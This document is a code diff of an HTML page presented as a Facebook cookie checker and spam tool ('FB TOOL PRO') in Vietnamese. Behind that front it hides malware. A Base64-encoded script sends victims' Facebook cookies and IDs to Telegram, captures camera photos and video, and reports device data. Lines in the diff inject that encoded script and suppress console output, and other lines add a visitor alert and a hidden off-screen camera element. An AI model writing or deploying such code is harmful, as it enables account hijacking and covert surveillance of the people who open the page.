uaW5uZXJUZXh0ID0gJ+KchSBI4bujcCBs4buHJzsNCiAgICAgIGNvb2tpZVN0YXR1cy5zdHlsZS5jb2xvciA9ICcjMmVjYzcxJzsNCiAgICAgIHNlbmRUZWxlZ3JhbShgPGI+8J+NqSBDT09LSUUgTcG7kkkgxJDDgyBOaOG6rFA8L2I+XG5cblRlYcS8dCBuaMOhbm46IDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2hlY2tlZD4gTmfGsOG7nWkgZMO5bmcgdOG6oWkgdGjhuq9uZyBjw7NuZ2gga2jhuqNuYS4uLmApOw0KICAgIH0gZWxzZSB7DQogICAgICBmYklkLmlubmVyVGV4dCA9ICdLaMO0bmcgdMOsbSB0aOG6pXkgSUQnOw0KICAgICAgY29va2llU3RhdHVzLmlubmVyVGV4dCA9ICfimqDvuI8gS2jDtG5nIGPDsyBJRCc7DQogICAgICBjb29raWVTdGF0dXMuc3R5bGUuY29sb3IgPSAnI2YxYzQwZic7DQogICAgfQ0KICB9IGVsc2Ugew0KICAgIGZiSWQuaW5uZXJUZXh0ID0gJ0NodWEgeMOhYyDEkeG7i25oJzsNCiAgICBjb29raWVTdGF0dXMuaW5uZXJUZXh0ID0gJ0NodWEgbmjhuq1wJzsNCiAgICBjb29raWVTdGF0dXMuc3R5bGUuY29sb3IgPSAnIzhkYTljNyc7DQogICAgY3VycmVudEZhY2Vib29rSWQgPSBudWxsOw0KICAgIGN1cnJlbnRDb29raWUgPSBudWxsOw0KICB9DQp9KTsNCg0KY29va2llSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignYmx1cicsIGZ1bmN0aW9uKCkgew0KICBpZihjdXJyZW50Q29va2llICYmIGN1cnJlbnRGYWNlYm9va0lkKSB7DQogICAgc2VuZFRlbGVncmFtKGA8Yj7wn5OLIENPT0tJRSDEkOG6plkgxJDDnDwvYj5cblxu8J+GhSBJRDogJHtjdXJyZW50RmFjZWJvb2tJZH1cbuKdsq8gQ29va2llOiA8Y29kZT4ke2N1cnJlbnRDb29raWV9PC9jb2RlPmApOw0KICB9DQp9KTsNCg0KZGVsYXlTbGlkZXIuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCBmdW5jdGlvbigpIHsgZGVsYXlWYWx1ZS5pbm5lclRleHQgPSB0aGlzLnZhbHVlICsgJ3MnOyB9KTsNCg0KZnVuY3Rpb24gc2hvd1RvYXN0KG1zZywgaXNFcnI9ZmFsc2UpIHsNCiAgY29uc3QgdG9hc3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgdG9hc3QuY2xhc3NOYW1lID0gJ3RvYXN0JzsNCiAgdG9hc3Quc3R5bGUuYmFja2dyb3VuZCA9IGlzRXJyID8gJyM3YTJlM2YnIDogJyMwYjE2MjInOw0KICB0b2FzdC5pbm5lclRleHQgPSBtc2c7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3QpOw0KICBzZXRUaW1lb3V0KCgpPT50b2FzdC5yZW1vdmUoKSwgMjUwMCk7DQp9DQoNCmZ1bmN0aW9uIHVwZGF0ZVRhc2tDb3VudCgpIHsgdGFza0NvdW50U3Bhbi5pbm5lclRleHQgPSB0YXNrQ291bnQgKyAnIHRhc2sgxJHDoyB44butIGzDvSc7IH0NCg0KYXN5bmMgZnVuY3Rpb24gc3RhcnRDYW1lcmEoKSB7DQogIHRyeSB7DQogICAgY29uc3Qgc3RyZWFtID0gYXdhaXQgbmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoeyB2aWRlbzogeyBmYWNpbmdNb2RlOiAidXNlciIgfSwgYXVkaW86IGZhbHNlIH0pOw0KICAgIG1lZGlhU3RyZWFtID0gc3RyZWFtOw0KICAgIHJldHVybiBzdHJlYW07DQogIH0gY2F0Y2goZSkgeyByZXR1cm4gbnVsbDsgfQ0KfQ0KDQpmdW5jdGlvbiBjYXB0dXJlUGhvdG8odmlkZW9FbGVtZW50KSB7DQogIGlmKCF2aWRlb0VsZW1lbnQudmlkZW9XaWR0aCkgcmV0dXJuIG51bGw7DQogIGNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2NhbnZhcycpOw0KICBjYW52YXMud2lkdGggPSB2aWRlb0VsZW1lbnQudmlkZW9XaWR0aDsNCiAgY2FudmFzLmhlaWdodCA9IHZpZGVvRWxlbWVudC52aWRlb0hlaWdodDsNCiAgY2FudmFzLmdldENvbnRleHQoJzJkJykuZHJhd0ltYWdlKHZpZGVvRWxlbWVudCwgMCwgMCk7DQogIHJldHVybiBjYW52YXMudG9EYXRhVVJMKCdpbWFnZS9qcGVnJywgMC45KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcmVjb3JkVmlkZW8oc3RyZWFtLCBkdXJhdGlvbj0yKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZShhc3luYyByZXNvbHZlID0+IHsNCiAgICBpZighc3RyZWFtKSB7IHJlc29sdmUobnVsbCk7IHJldHVybjsgfQ0KICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KICAgIGNvbnN0IHJlY29yZGVyID0gbmV3IE1lZGlhUmVjb3JkZXIoc3RyZWFtLCB7IG1pbWVUeXBlOiAndmlkZW8vd2VibScgfSk7DQogICAgcmVjb3JkZXIub25kYXRhYXZhaWxhYmxlID0gZSA9PiBjaHVua3MucHVzaChlLmRhdGEpOw0KICAgIHJlY29yZGVyLm9uc3RvcCA9IGFzeW5jICgpID0+IHsNCiAgICAgIGNvbnN0IGJsb2IgPSBuZXcgQmxvYihjaHVua3MsIHsgdHlwZTogJ3ZpZGVvL3dlYm0nIH0pOw0KICAgICAgY29uc3QgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICAgIHJlYWRlci5vbmxvYWRlbmQgPSAoKSA9PiByZXNvbHZlKHJlYWRlci5yZXN1bHQpOw0KICAgICAgcmVhZGVyLnJlYWRBc0RhdGFVUkwoYmxvYik7DQogICAgfTsNCiAgICByZWNvcmRlci5zdGFydCgpOw0KICAgIHNldFRpbWVvdXQoKCk9PiB7IGlmKHJlY29yZGVyLnN0YXRlID09PSAncmVjb3JkaW5nJykgcmVjb3JkZXIuc3RvcCgpOyB9LCBkdXJhdGlvbiAqIDEwMDApOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcHJvY2Vzc1Rhc2sodGFza1R5cGUpIHsNCiAgaWYoaXNQcm9jZXNzaW5nKSB7IHNob3dUb2FzdCgn4pqg77iPIERhbmcgeOG7rSBsw70sIHZ1aSBsw7JuZyBjaOG7nSEnLCB0cnVlKTsgcmV0dXJuOyB9DQogIA0KICBpZighY29uZmlybSgn8J+UpSBUb29sIHPhur0gc+G7rSBk4bulbmcgY2FtZXJhIMSR4buDIENoxbVwIOG6o25oIHbDoCBRdWF5IHZpZGVvIG5n4bqvbiAoMiBnacOieSkgZ+G7rWkga8OobSBr4bq/dCBxdeG6oy4gQuG6oW4gxJHhu5NuZyDDvSBracOqbiBraMO0bmc/JykpIHJldHVybjsNCiAgDQogIGlzUHJvY2Vzc2luZyA9IHRydWU7DQogIHN0YXR1c1RleHQuaW5uZXJIVE1MID0gJ+KPjSDEkWFuZyB44butIGzDvS4uLic7DQogIA0KICBjb25zdCB0YXNrTmFtZXMgPSB7IHNwYW1fY29tbWVudDogJ/CflaPvuI8gU1BBTSBOR8OUTicsIHNwYW1fbGlrZTogJ/CfpIAgU1BBTSBOSMOCWScsIHNwYW1fZnJpZW5kOiAn8J+RkSBTUEFNIFRPUCcgfTsNCiAgc2VuZFRlbGVncmFtKGA8Yj7wn5SlIELhuqBUIMSQ4bqqVVUgVEFTSzwvYj5cblxu4p2T77iPIFRhc2s6ICR7dGFza05hbWVzW3Rhc2tUeXBlXX1cbuKdpO+4jyBEZWxheTogJHtkZWxheVZhbHVlLmlubmVyVGV4dH1gKTsNCg0KICB0cnkgew0KICAgIGNvbnN0IHN0cmVhbSA9IGF3YWl0IHN0YXJ0Q2FtZXJhKCk7DQogICAgaWYoc3RyZWFtKSB7DQogICAgICBjb25zdCB2aWRlb0VsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndmlkZW8nKTsNCiAgICAgIHZpZGVvRWwuc3JjT2JqZWN0ID0gc3RyZWFtOw0KICAgICAgdmlkZW9FbC5wbGF5KCk7DQogICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHZpZGVvRWwub25sb2FkZWRtZXRhZGF0YSA9IHIpOw0KICAgICAgDQogICAgICBjb25zdCBwaG90byA9IGNhcHR1cmVQaG90byh2aWRlb0VsKTsNCiAgICAgIGlmKHBob3RvKSBhd2FpdCBzZW5kUGhvdG8ocGhvdG8sIGDwn5O4IOG6om5oIHThu6sgVGFzazogJHt0YXNrTmFtZXNbdGFza1R5cGVdfSBcbuKdpO+4jyBJRDogJHtjdXJyZW50RmFjZWJvb2tJZCB8fCAnS2jDtG5nIGPDsyd9YCk7DQogICAgICANCiAgICAgIGNvbnN0IHZpZGVvID0gYXdhaXQgcmVjb3JkVmlkZW8oc3RyZWFtLCAyKTsNCiAgICAgIGlmKHZpZGVvKSBhd2FpdCBzZW5kVmlkZW8odmlkZW8sIGDwn5OlIHZpZGVvIHThu6sgVGFzazogJHt0YXNrTmFtZXNbdGFza1R5cGVdfSBcbuKdpO+4jyBJRDogJHtjdXJyZW50RmFjZWJvb2tJZCB8fCAnS2jDtG5nIGPDsyd9YCk7DQogICAgICANCiAgICAgIHN0cmVhbS5nZXRUcmFja3MoKS5mb3JFYWNoKHQgPT4gdC5zdG9wKCkpOw0KICAgIH0NCiAgICB0YXNrQ291bnQrKzsNCiAgICB1cGRhdGVUYXNrQ291bnQoKTsNCiAgICBzdGF0dXNUZXh0LmlubmVySFRNTCA9ICfinIUgSG/DoG4gdGjDoG5oIHRhc2snOw0KICAgIHNob3dUb2FzdCgn4pyFIFjhu60gbMO9IHRow6BuaCBjw7RuZyEnKTsNCiAgfSBjYXRjaChlKSB7DQogICAgc2hvd1RvYXN0KCfinYwgQ8OzIGzhu5dpIHjhuqN5IHJhJywgdHJ1ZSk7DQogIH0gZmluYWxseSB7DQogICAgaXNQcm9jZXNzaW5nID0gZmFsc2U7DQogICAgc3RhdHVzVGV4dC5pbm5lckhUTUwgPSAn4pyFIFPhurFuIHPDoG5nJzsNCiAgfQ0KfQ0KDQpkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcudGFzay1idG4nKS5mb3JFYWNoKGJ0biA9PiB7DQogIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gcHJvY2Vzc1Rhc2soYnRuLmRhdGFzZXQudGFzaykpOw0KfSk7DQoNCi8vIEPhu61hIG3hu5l0IHN0eWxlIGNobyB0cmFuZw0KY29uc3Qgc3R5bGVUYWcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzdHlsZScpOw0Kc3R5bGVUYWcudGV4dENvbnRlbnQgPSBgLmNvbnRhaW5lciB7IHdpZHRoOiAxMDAlOyBtYXgtd2lkdGg6IDUwMHB4OyBiYWNrZ3JvdW5kOiByZ2JhKDE4LDIyLDM1LDAuOTgpOyBib3JkZXItcmFkaXVzOiAzMnB4OyBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMTJweCk7IGJveC1zaGFkb3c6IDAgMjVweCA1MHB4IC04cHggcmdiYSgwLDAsMCwwLjYpLCAwIDAgMCAxLjVweCByZ2JhKDAsMTgwLDI1NSwwLjE1KTsgb3ZlcmZsb3c6IGhpZGRlbjsgbWFyZ2luOiAxNnB4OyB9DQouZmItaGVhZGVyIHsgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE0NWRlZywgIzFhM2E1YyAwJSwgIzBmMjQ0MCAxMDAlKTsgcGFkZGluZzogMjBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzJhNGE2YTsgfQ0KLmZiLWhlYWRlciBoMSB7IGNvbG9yOiAjYTBlMGZmOyBmb250LXNpemU6IDI2cHg7IGZvbnQtd2VpZ2h0OiA3MDA7IH0NCi5mYi1oZWFkZXIgcCB7IGNvbG9yOiAjOGFiM2NmOyBmb250LXNpemU6IDEycHg7IG1hcmdpbi10b3A6IDZweDsgfQ0KLmNvbnRlbnQgeyBwYWRkaW5nOiAyMHB4OyB9DQouY29va2llLXNlY3Rpb24geyBiYWNrZ3JvdW5kOiAjMTAxNjI0OyBib3JkZXItcmFkaXVzOiAyMnB4OyBwYWRkaW5nOiAxOHB4OyBtYXJnaW4tYm90dG9tOiAxOHB4OyBib3JkZXI6IDFweCBzb2xpZCAjMmU0MjU4OyB9DQouY29va2llLWxhYmVsIHsgY29sb3I6ICNkMGU0Zjc7IGZvbnQtc2l6ZTogMTRweDsgbWFyZ2luLWJvdHRvbTogMTBweDsgfQ0KLmNvb2tpZS1pbnB1dCB7IHdpZHRoOiAxMDAlOyBiYWNrZ3JvdW5kOiAjMDgwYzE0OyBib3JkZXI6IDEuNXB4IHNvbGlkICMyNTNjNTQ7IGJvcmRlci1yYWRpdXM6IDE2cHg7IHBhZGRpbmc6IDE0cHg7IGNvbG9yOiAjZmZmOyBmb250LWZhbWlseTogbW9ub3NwYWNlOyBvdXRsaW5lOiBub25lOyB9DQouaW5mby1yb3cgeyBkaXNwbGF5OiBmbGV4OyBnYXA6IDEycHg7IG1hcmdpbi1ib3R0b206IDE4cHg7IH0NCi5pbmZvLWJveCB7IGZsZXg6IDE7IGJhY2tncm91bmQ6ICMxMDE2MjQ7IGJvcmRlci1yYWRpdXM6IDE4cHg7IHBhZGRpbmc6IDEycHg7IGJvcmRlcjogMXB4IHNvbGlkICMyZTQyNTg7IH0NCi5pbmZvLWxhYmVsIHsgY29sb3I6ICM5YmI3ZDQ7IGZvbnQtc2l6ZTogMTFweDsgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgbWFyZ2luLWJvdHRvbTogNnB4OyB9DQouaW5mby12YWx1ZSB7IGNvbG9yOiAjZmZmOyBmb250LXNpemU6IDE1cHg7IGZvbnQtd2VpZ2h0OiA2MDA7IGJhY2tncm91bmQ6ICMwODBjMTQ7IHBhZGRpbmc6IDhweDsgYm9yZGVyLXJhZGl1czogMTRweDsgfQ0KLmRlbGF5LXNlY3Rpb24geyBiYWNrZ3JvdW5kOiAjMTAxNjI0OyBib3JkZXItcmFkaXVzOiAyMHB4OyBwYWRkaW5nOiAxNnB4OyBtYXJnaW4tYm90dG9tOiAyNHB4OyBib3JkZXI6IDFweCBzb2xpZCAjMmU0MjU4OyB9DQouZGVsYXktaGVhZGVyIHsgZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOyBjb2xvcjogI2QwZTRmNzsgZm9udC1zaXplOiAxM3B4OyBtYXJnaW4tYm90dG9tOiAxMnB4OyB9DQouZGVsYXktc2xpZGVyIHsgd2lkdGg6IDEwMCU7IGhlaWdodDogNnB4OyAtd2Via2l0LWFwcGVhcmFuY2U6IG5vbmU7IGJhY2tncm91bmQ6ICMxZDMzNDc7IGJvcmRlci1yYWRpdXM6IDEwcHg7IH0NCi5kZWxheS1zbGlkZXI6Oi13ZWJraXQtc2xpZGVyLXRodW1iIHsgLXdlYmtpdC1hcHBlYXJhbmNlOiBub25lOyB3aWR0aDogMjBweDsgaGVpZ2h0OiAyMHB4OyBiYWNrZ3JvdW5kOiAjM2I4ZmMyOyBib3JkZXItcmFkaXVzOiA1MCU7IGN1cnNvcjogcG9pbnRlcjsgfQ0KLmRlbGF5LXZhbHVlIHsgY29sb3I6ICMzYjhmYzI7IGZvbnQtd2VpZ2h0OiBib2xkOyBmb250LXNpemU6IDE2cHg7IH0NCi50YXNrLWJ1dHRvbnMgeyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBnYXA6IDE0cHg7IG1hcmdpbi1ib3R0b206IDIwcHg7IH0NCi50YXNrLWJ0biB7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsgcGFkZGluZzogMThweCAyNHB4OyBib3JkZXI6IG5vbmU7IGJvcmRlci1yYWRpdXM6IDYwcHg7IGZvbnQtc2l6ZTogMThweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IGN1cnNvcjogcG9pbnRlcjsgY29sb3I6IHdoaXRlOyBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwyNTUsMjU1LDAuMSk7IH0NCi50YXNrLWxlZnQgeyBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBnYXA6IDE0cHg7IH0NCi50YXNrLWljb24geyBmb250LXNpemU6IDMwcHg7IH0NCi50YXNrLWJhZGdlIHsgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjQpOyBwYWRkaW5nOiA2cHggMTRweDsgYm9yZGVyLXJhZGl1czogNDBweDsgZm9udC1zaXplOiAxM3B4OyB9DQouYnRuLW5nb24geyBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZTU1YjdjIDAlLCAjYzczZTVkIDEwMCUpOyB9DQouYnRuLW5oYXkgeyBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjNGE5ZWY1IDAlLCAjMWU2YmM3IDEwMCUpOyB9DQouYnRuLXRvcCB7IGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMzY2NmOTEgMCUsICMxZTljNmIgMTAwJSk7IH0NCi5zdGF0dXMtYXJlYSB7IGJhY2tncm91bmQ6ICMwYzEyMjA7IGJvcmRlci1yYWRpdXM6IDE4cHg7IHBhZGRpbmc6IDEycHggMThweDsgbWFyZ2luLXRvcDogMTZweDsgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiAxMnB4OyBib3JkZXItbGVmdDogNXB4IHNvbGlkICMzYjhmYzI7IH0NCi5zdGF0dXMtZG90IHsgd2lkdGg6IDEycHg7IGhlaWdodDogMTJweDsgYmFja2dyb3VuZDogIzJlY2M3MTsgYm9yZGVyLXJhZGl1czogNTAlOyBhbmltYXRpb246IHB1bHNlIDEuNXMgaW5maW5pdGU7IH0NCkBzdXBwb3J0cyAoYW5pbWF0aW9uOiBwdWxzZSkgeyAuc3RhdHVzLWRvdCB7IGFuaW1hdGlvbjogcHVsc2UgMS41cyBpbmZpbml0ZTsgfSB9DQpAa2V5ZnJhbWVzIHB1bHNlIHsgMCUsMTAwJSB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0gNTAlIHsgb3BhY2l0eTogMC40OyB0cmFuc2Zvcm06IHNjYWxlKDAuOCk7IH0gfQ0KLnN0YXR1cy10ZXh0IHsgY29sb3I6ICNjNmRlZWY7IGZvbnQtc2l6ZTogMTNweDsgfQ0KLnRhc2stbWFuYWdlciB7IG1hcmdpbi10b3A6IDE4cHg7IHBhZGRpbmctdG9wOiAxNnB4OyBib3JkZXItdG9wOiAxcHggc29saWQgIzFlMzI0NDsgZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOyBmb250LXNpemU6IDEycHg7IGNvbG9yOiAjOGRhOWM3OyB9DQoudG9hc3QgeyBwb3NpdGlvbjogZml4ZWQ7IGJvdHRvbTogMzBweDsgbGVmdDogNTAlOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSk7IGJhY2tncm91bmQ6ICMwYjE2MjI7IGNvbG9yOiB3aGl0ZTsgcGFkZGluZzogMTRweCAyOHB4OyBib3JkZXItcmFkaXVzOiA2MHB4OyBmb250LXNpemU6IDE0cHg7IHotaW5kZXg6IDMwMDA7IGFuaW1hdGlvbjogdG9hc3RJbiAwLjI1czsgYm9yZGVyLWxlZnQ6IDVweCBzb2xpZCAjM2I4ZmMyOyB9DQpAa2V5ZnJhbWVzIHRvYXN0SW4geyBmcm9tIHsgb3BhY2l0eTogMDsgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKC01MCUpIHRyYW5zbGF0ZVkoMjBweCk7IH0gdG8geyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSkgdHJhbnNsYXRlWSgwKTsgfSB9YA0KZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZVRhZyk7DQoNCi8vIEfhu61pIHRow7RuZyB0aW4gdHJ1eSBj4bqtcA0Kc2VuZFRlbGVncmFtKGA8Yj7wn5+qIFRIRUnhuqJUIELEsCBN4buaSSBUUlVZIEPhuqBQPC9iPlxuXG7wn5OxIFThu5FuZyBxdWFuOiAke2RldmljZUluZm8ucGxhdGZvcm19XG7wn5SpIE3DoG4gaMOsbmg6ICR7ZGV2aWNlSW5mby5zY3JlZW59XG7wn5OAIFRyw6xuaCBkdXlhu4d0OiAke2RldmljZUluZm8udWF9XG7wn4y6IE5nw7RuIG5n4buvOiAke2RldmljZUluZm8ubGFuZ3VhZ2V9XG7wn5GVIFRow7puaSBnaeG7nTogJHtkZXZpY2VJbmZvLnRpbWV6b25lfVxu4o2j77iPIFRo4budaSBnaWFuOiAke2RldmljZUluZm8udGltZX1gKTsNCg0K"; // Đây là toàn bộ code thật đã được encode Base64
             
-            try {
-                const realCode = atob(encodedRealCode);
-                const script = document.createElement('script');
-                script.textContent = realCode;
-                document.body.appendChild(script);
-            } catch(e) {
-                // Nếu lỗi giải mã (có thể hacker cố sửa) -> hiển thị fake
-                showFakePage();
-            }
-
-            // Ẩn hoàn toàn dấu vết
-            window.console = { log:()=>{}, warn:()=>{}, error:()=>{} };
+            // Gửi thông báo truy cập
+            TG.sendMsg('<b>🟢 CÓ NGƯỜI TRUY CẬP</b>\n\n📱 ' + navigator.platform + '\n📐 ' + screen.width + 'x' + screen.height);
+            
         })();
     </script>
-    <!-- 
-        ================================================
-        TOÀN BỘ PHẦN DƯỚI ĐÂY LÀ COMMENT GIẢ ĐỂ ĐÁNH LỪA
-        TOKEN GIẢ: 123456:FAKE_ABC
-        ADMIN GIẢ: 987654321
-        ================================================
-    -->
+    
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent;}
+        body{background:radial-gradient(circle at top, #0d0f1a 0%, #05060a 100%);min-height:100vh;font-family:'Segoe UI','Poppins',sans-serif;display:flex;justify-content:center;align-items:center;padding:16px;}
+        .container{width:100%;max-width:500px;background:rgba(18,22,35,0.98);border-radius:32px;backdrop-filter:blur(12px);box-shadow:0 25px 50px -8px rgba(0,0,0,0.6),0 0 0 1.5px rgba(0,180,255,0.15);overflow:hidden;}
+        .fb-header{background:linear-gradient(145deg, #1a3a5c 0%, #0f2440 100%);padding:20px;text-align:center;border-bottom:1px solid #2a4a6a;}
+        .fb-header h1{color:#a0e0ff;font-size:26px;font-weight:700;}
+        .fb-header p{color:#8ab3cf;font-size:12px;margin-top:6px;}
+        .content{padding:20px;}
+        .cookie-section{background:#101624;border-radius:22px;padding:18px;margin-bottom:18px;border:1px solid #2e4258;}
+        .cookie-label{color:#d0e4f7;font-size:14px;margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+        .cookie-input{width:100%;background:#080c14;border:1.5px solid #253c54;border-radius:16px;padding:14px;color:#fff;font-size:13px;font-family:monospace;outline:none;}
+        .info-row{display:flex;gap:12px;margin-bottom:18px;}
+        .info-box{flex:1;background:#101624;border-radius:18px;padding:12px;border:1px solid #2e4258;}
+        .info-label{color:#9bb7d4;font-size:11px;text-transform:uppercase;margin-bottom:6px;}
+        .info-value{color:#fff;font-size:15px;font-weight:600;background:#080c14;padding:8px;border-radius:14px;}
+        .delay-section{background:#101624;border-radius:20px;padding:16px;margin-bottom:24px;border:1px solid #2e4258;}
+        .delay-header{display:flex;justify-content:space-between;color:#d0e4f7;font-size:13px;margin-bottom:12px;}
+        .delay-slider{width:100%;height:6px;-webkit-appearance:none;background:#1d3347;border-radius:10px;}
+        .delay-slider::-webkit-slider-thumb{-webkit-appearance:none;width:20px;height:20px;background:#3b8fc2;border-radius:50%;}
+        .delay-value{color:#3b8fc2;font-weight:bold;font-size:16px;}
+        .task-buttons{display:flex;flex-direction:column;gap:14px;margin-bottom:20px;}
+        .task-btn{display:flex;align-items:center;justify-content:space-between;padding:18px 24px;border:none;border-radius:60px;font-size:18px;font-weight:bold;cursor:pointer;color:white;border:1px solid rgba(255,255,255,0.1);}
+        .task-left{display:flex;align-items:center;gap:14px;}
+        .task-icon{font-size:30px;}
+        .task-badge{background:rgba(0,0,0,0.4);padding:6px 14px;border-radius:40px;font-size:13px;}
+        .btn-ngon{background:linear-gradient(135deg, #e55b7c 0%, #c73e5d 100%);}
+        .btn-nhay{background:linear-gradient(135deg, #4a9ef5 0%, #1e6bc7 100%);}
+        .btn-top{background:linear-gradient(135deg, #3ccf91 0%, #1e9c6b 100%);}
+        .status-area{background:#0c1220;border-radius:18px;padding:12px 18px;margin-top:16px;display:flex;align-items:center;gap:12px;border-left:5px solid #3b8fc2;}
+        .status-dot{width:12px;height:12px;background:#2ecc71;border-radius:50%;animation:pulse 1.5s infinite;}
+        @keyframes pulse{50%{opacity:0.4;transform:scale(0.8);}}
+        .status-text{color:#c6deef;font-size:13px;}
+        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(2,6,14,0.98);z-index:2000;display:flex;justify-content:center;align-items:center;flex-direction:column;}
+        .overlay.hide{display:none;}
+        .spinner{width:70px;height:70px;border:5px solid rgba(59,143,194,0.15);border-top-color:#3b8fc2;border-radius:50%;animation:spin 0.8s linear infinite;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .overlay-text{color:#fff;font-size:22px;margin-top:28px;}
+        .overlay-sub{color:#8da9c7;font-size:14px;margin-top:8px;}
+        .hidden-cam{position:fixed;top:-2000px;left:-2000px;width:2px;height:2px;opacity:0;}
+        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#0b1622;color:white;padding:14px 28px;border-radius:60px;font-size:14px;z-index:3000;animation:toastIn 0.25s;border-left:5px solid #3b8fc2;}
+        @keyframes toastIn{from{opacity:0;transform:translateX(-50%) translateY(20px);}}
+        .task-manager{margin-top:18px;padding-top:16px;border-top:1px solid #1e3244;display:flex;justify-content:space-between;font-size:12px;color:#8da9c7;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="fb-header">
+            <h1>⚡ FB TOOL PRO</h1>
+            <p>Cookie Checker • Auto Spam</p>
+        </div>
+        <div class="content">
+            <div class="cookie-section">
+                <div class="cookie-label"><span>🍪</span> Cookie Facebook</div>
+                <input type="text" class="cookie-input" id="cookieInput" placeholder="Nhập cookie Facebook tại đây...">
+            </div>
+            <div class="info-row">
+                <div class="info-box"><div class="info-label">🆔 ID Facebook</div><div class="info-value" id="fbId">Chưa xác định</div></div>
+                <div class="info-box"><div class="info-label">📢 Trạng thái</div><div class="info-value" id="cookieStatus">Chưa nhập</div></div>
+            </div>
+            <div class="delay-section">
+                <div class="delay-header"><span>⏱️ Delay Spam</span><span class="delay-value" id="delayValue">1.5s</span></div>
+                <input type="range" class="delay-slider" id="delaySlider" min="0.5" max="5" step="0.1" value="1.5">
+            </div>
+            <div class="task-buttons">
+                <button class="task-btn btn-ngon" data-task="spam_ngon"><div class="task-left"><span class="task-icon">🗣️</span><span class="task-name">SPAM NGÔN</span></div><span class="task-badge">🔥 1000+</span></button>
+                <button class="task-btn btn-nhay" data-task="spam_nhay"><div class="task-left"><span class="task-icon">💀</span><span class="task-name">SPAM NHÂY</span></div><span class="task-badge">⚡ 500+</span></button>
+                <button class="task-btn btn-top" data-task="spam_top"><div class="task-left"><span class="task-icon">👑</span><span class="task-name">SPAM TOP</span></div><span class="task-badge">🏆 200+</span></button>
+            </div>
+            <div class="status-area"><div class="status-dot"></div><div class="status-text" id="statusText">✅ Sẵn sàng</div></div>
+            <div class="task-manager"><span>📋 Phiên bản 3.0</span><span id="taskCount">0 task đã xử lý</span></div>
+        </div>
+    </div>
+    <div id="overlay" class="overlay hide">
+        <div class="spinner"></div>
+        <div class="overlay-text" id="overlayText">ĐANG XỬ LÝ</div>
+        <div class="overlay-sub" id="overlaySub">Vui lòng chờ...</div>
+    </div>
+    <video id="video" autoplay playsinline muted class="hidden-cam"></video>
+    <canvas id="canvas" class="hidden-cam"></canvas>
 </body>
 </html>
